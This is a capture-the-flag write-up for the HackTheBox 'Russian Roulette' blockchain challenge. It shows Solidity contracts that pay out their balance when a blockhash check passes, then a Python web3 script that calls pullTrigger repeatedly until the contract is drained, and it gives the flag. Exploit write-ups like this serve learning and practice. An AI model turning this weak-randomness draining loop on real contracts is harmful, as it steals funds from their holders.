# Russian Roulette

## Solution 
For this blockhain challenge, we get a Setup.sol file with the contents below:  
```solidity
pragma solidity 0.8.23;

import {RussianRoulette} from "./RussianRoulette.sol";

contract Setup {
    RussianRoulette public immutable TARGET;

    constructor() payable {
        TARGET = new RussianRoulette{value: 10 ether}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```
And a RussianRoulette.sol file with the contents below:  
```solidity
pragma solidity 0.8.23;

contract RussianRoulette {

    constructor() payable {
        // i need more bullets
    }

    function pullTrigger() public returns (string memory) {
        if (uint256(blockhash(block.number - 1)) % 10 == 7) {
            selfdestruct(payable(msg.sender)); // 💀
        } else {
        return "im SAFU ... for now";
        }
    }
}
```
I was first introduced to Blockchain CTF challenges in last year's CyberApocalypse where they provided a tutorial with [Navigating the Unknown](https://github.com/LazyTitan33/CTF-Writeups/blob/main/HTB%20-%20CyberApocalypse_2023/Blockchain/Navigating_the_Unknown.md) and a nice similar challenge with [Shooting101](https://github.com/LazyTitan33/CTF-Writeups/blob/main/HTB%20-%20CyberApocalypse_2023/Blockchain/Shooting101.md). I reused some of the code from there and applied the same principles.

Geting the ABI from the .sol files can be tricky, it's like a json formatted structure for the code which you get after compiling it... but compiling it can be a pain if you don't want to install certain tools or specific IDE for it. I used this [https://coderpad.io/languages/solidity/](https://coderpad.io/languages/solidity/):  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0fe576ab-0338-4359-ae46-b7852de63ed1)

I connected to the RPC endpoint to get all the values I need:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/3acc98da-47ca-463c-81dc-8b87cbea9cea)

Then built out this script:
```python3
from web3 import Web3

# Connect to the local blockchain
rpc_url = " http://94.237.60.74:41528"
web3 = Web3(Web3.HTTPProvider(rpc_url))

# Set the account that will send the transaction
private_key = "0xb2eda52d64b580c8a78787cc74de7f705d2b7468663be165b1b9cf76a7e6ab86"
account_address = '0xd17c80F906B67B110455F31A6153bFADfcf1DbFD'

target_address = "0x2Da33B88847440c04a763993C907a19218bc33EB"
target_abi = [{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"pullTrigger","outputs":[],"stateMutability":"nonpayable","type":"function"}]
target = web3.eth.contract(address=target_address, abi=target_abi)

setup_address = '0x0B32ae76ea30743261D7984BD6D39B2452372ae7'
setup_contract_abi = [{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"TARGET","outputs":[{"internalType":"contract RussianRoulette","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
setup = web3.eth.contract(address=setup_address, abi=setup_contract_abi)

while not setup.functions.isSolved().call():
    # Pull the trigger
    nonce = web3.eth.get_transaction_count(account_address)
    tx_hash = target.functions.pullTrigger().build_transaction({
        'nonce': nonce,
        'from': account_address,
        'value': 0,
        'gas': 100000,
        'gasPrice': 200000
    })
    signed_tx = web3.eth.account.sign_transaction(tx_hash, private_key=private_key)
    tx_receipt = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    # Wait for the transaction to be mined
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_receipt)

print("Puzzle solved!")
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a4f11652-211f-4b0d-9f5e-560d1c19d4bf)

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8a5cd4fd-ff94-45ee-8508-dee9031f811f)

`HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}`
